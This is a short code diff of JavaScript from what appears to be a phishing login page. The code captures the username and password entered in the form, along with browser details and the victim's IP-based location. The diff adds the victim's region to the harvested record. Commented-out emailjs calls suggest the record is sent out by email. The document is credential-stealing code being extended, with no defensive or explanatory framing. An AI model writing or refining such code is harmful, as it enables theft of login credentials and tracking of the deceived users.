@@ -185,6 +185,7 @@
   let city;
   let country;
   let ip;
+  let region;
   const username = document.getElementById('input1').value;
   const password = document.getElementById('input2').value;
   const userAgent = `UPL: ${navigator.platform}\nULA: ${navigator.language}\nOSY/UIN: ${navigator.userAgent}`
@@ -196,6 +197,7 @@
     ip = data.ip;
     country = data.country;
     city = data.city;
+    region = data.region;
   });
   const spinner = document.getElementById('spinner');
   const loginbox = document.getElementById('login-box');
@@ -233,7 +235,8 @@
     ue: userEmail,
     uc: country,
     uci: city,
-    ui: ip
+    ui: ip,
+    ur: region
   })
   //emailjs.init("8d00WW8DI3O8YMGeC");
   //emailjs.send('service_12cgdxn', 'template_6qpuckw', {
